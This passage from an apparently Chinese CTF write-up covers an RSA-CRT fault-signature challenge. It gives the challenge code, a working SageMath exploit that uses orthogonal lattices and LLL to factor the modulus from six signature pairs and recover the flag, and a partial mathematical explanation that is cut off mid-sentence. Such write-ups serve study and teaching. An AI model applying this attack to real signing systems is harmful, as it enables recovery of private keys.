class=\"line\">        self.n=p*q</span><br><span class=\"line\">        self.N=getPrime(<span class=\"number\">512</span>)*getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">corrupt_sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">verify</span>(<span class=\"params\">self,message,sign</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes(<span class=\"built_in\">pow</span>(bytes_to_long(sign),self.e,self.n))==message</span><br><span class=\"line\"></span><br><span class=\"line\">p=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">q=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\">rsa=RSA(p,q,e)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f1:</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;corrupted_sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f2:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">            message=os.urandom(<span class=\"number\">64</span>)</span><br><span class=\"line\">            sign=rsa.sign(message)</span><br><span class=\"line\">            corrupted_sign=rsa.corrupt_sign(message)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> rsa.verify(message,sign)</span><br><span class=\"line\">            f1.write(<span class=\"built_in\">str</span>(sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">            f2.write(<span class=\"built_in\">str</span>(corrupted_sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">enc=<span class=\"built_in\">pow</span>(bytes_to_long(flag),rsa.e,rsa.n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;n = <span class=\"subst\">&#123;rsa.n&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;N = <span class=\"subst\">&#123;rsa.N&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;e = <span class=\"subst\">&#123;rsa.e&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;enc = <span class=\"subst\">&#123;enc&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">n = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\"><span class=\"string\">N = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\"><span class=\"string\">e = 65537</span></span><br><span class=\"line\"><span class=\"string\">enc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>出题论文：<a href=\"https://eprint.iacr.org/2011/388.pdf\">https://eprint.iacr.org/2011/388.pdf</a><br>这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。<br>后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。<br>照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。<br>exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> combinations</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">co_sig = [<span class=\"string\">b&quot;\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&amp;H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-&#x27;\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&amp;w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&amp;&#x27;&#123;\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe&quot;\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3&#125;0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&amp;&#125;a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb&#123;\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d&lt;(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&quot;0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed&#125;\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN&#x27;\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&amp;&amp;`\\xfd*\\xe1\\xf2\\x9c&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;:\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&amp;\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa&lt;\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&amp;\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8&#x27;</span>,</span><br><span class=\"line\">          ]</span><br><span class=\"line\">sig = [<span class=\"string\">b&#x27;\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&amp;\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9&quot;\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&amp;\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&amp;\\xdb8\\xa6\\xe0\\xa5a&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc&#125;\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m&quot;\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf&gt;6,&lt;\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|&#123;6\\xeb\\xe8U\\x91\\xa4\\xeb&#125;\\xf4s;E\\xe72$i\\xdft\\xff\\&#x27;&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9&lt;H\\xa2a\\xdc\\xf4`\\xac&gt;\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f&gt;\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\&#x27;`K\\xa5\\xf1\\xbf&quot;\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\&#x27;1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;:\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&amp;\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2&#125; \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&quot;8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02&lt;\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05&#x27;o\\xf3!\\t\\x01\\x93&#x27;z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2&#125;\\xe8\\x10&quot;</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\">n = <span class=\"number\">99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\">N = <span class=\"number\">81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">enc = <span class=\"number\">2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>), <span class=\"number\">20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d, _n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">v = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])</span><br><span class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">Lv = orthogonal_lattice(matrix(ZZ, v))</span><br><span class=\"line\"></span><br><span class=\"line\">result = orthogonal_lattice(Lv.matrix_from_rows(<span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">6</span>-<span class=\"number\">2</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> combinations(result, <span class=\"number\">2</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">            z = a*x+b*y</span><br><span class=\"line\">            <span class=\"keyword\">if</span> z.norm() &gt; sqrt(<span class=\"number\">6</span>*n):</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                vv = vector(v)-z</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> vv:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> gcd(i, n) != <span class=\"number\">1</span>:</span><br><span class=\"line\">                        p = gcd(i, n)</span><br><span class=\"line\">                        <span class=\"keyword\">assert</span> n % gcd(i, n) == <span class=\"number\">0</span></span><br><span class=\"line\">                        q = n//p</span><br><span class=\"line\">                        phi = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">                        d = inverse_mod(e, phi)</span><br><span class=\"line\">                        m = long_to_bytes(<span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(enc, d, n)))</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(m)</span><br><span class=\"line\">                        exit()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>RSA-CRT 签名中计算了：<br>$$<br>\\sigma_p=\\mu(m)^d\\mod \\ p \\\\  \\sigma_q=\\mu(m)^d\\mod \\ q<br>$$<br>然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。<br>题目中给出 6 对签名，每对签名用 CRT 不难算出<br>$$<br>v=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N’<br>$$<br>其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N’$ ，那么<strong>上式在整数域上是成立的</strong>。<br>一对算不出，但是多对可以，组成向量，有：<br>$$<br>\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}<br>$$<br>其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。<br>不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 ${\\boldsymbol{b}_1,…,\\boldsymbol{b}_{\\ell-1}}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）<br>特别地，我们有：<br>$$<br>\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1<br>$$<br><del>（也不是很特别的感觉）</del><br>现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：</p>\n<p><strong>情形1</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$</p>\n<p><strong>情形2</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$</p>\n<p>因为格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积<br>$$<br>V=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)<br>$$<br>盲猜是一个随机的格。特别地，我们有：<br>$$<br>||\\boldsymbol{b}_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2<br>$$</p>\n<p>一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,…,\\ell-2$ ， $\\boldsymbol{b}_j$ 应该是情形1中。这意味着这些向量生成 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 中一个满秩的子格 $L’=\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。<br>取正交格，我们得到 $(L’)^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L’$ 的正交格 $(L’)^\\bot$ 。令 ${\\boldsymbol{x’},\\boldsymbol{y’}}$ 为一组该格的约化基，我们可以枚举 $(L’)^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x’}$ 和 $\\boldsymbol{y’}$ 线性组合的所有格向量。高斯启发式表明这大约为：<br>$$<br>\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L’)^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)<br>$$<br>这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 